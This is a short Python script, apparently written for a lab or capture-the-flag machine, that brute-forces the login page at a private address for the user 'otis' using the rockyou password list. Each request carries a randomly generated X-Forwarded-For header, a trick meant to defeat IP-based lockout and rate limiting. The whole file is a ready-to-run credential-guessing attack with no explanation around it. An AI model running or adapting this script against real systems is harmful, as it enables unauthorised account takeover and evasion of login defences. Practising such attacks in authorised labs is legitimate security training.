
import requests
import string
import random


username="otis"
passwordlist="/usr/share/wordlists/rockyou.txt"

testpass = "test"


url = "http://192.168.212.124/monitoring/login.php"

def rand_ip():
    num1 = ''.join(random.choice(string.digits) for _ in range(3))
    num2 = ''.join(random.choice(string.digits) for _ in range(3))
    num3 = ''.join(random.choice(string.digits) for _ in range(3))
    return f"192.{num1}.{num2}.{num3}"


def Login(user, password):
    s = requests.Session()
    data = {
        "username":user,
        "password":password
    }
    headers = {"X-Forwarded-For":rand_ip()}

   # p = {"http":"http://127.0.0.1:8080"}

    r = s.post(url, data=data,headers=headers, verify=False)
    
    if not "Sign In" in r.text:        
        return True
    return False



with open(passwordlist, 'r') as f:
    for line in f:
        if Login(username, line.strip()):
            print(f"Username: {username}, Password: {line.strip()}")
            exit(0)
        else:
            print(f"Testing: Username: {username}, Password: {line.strip()}")
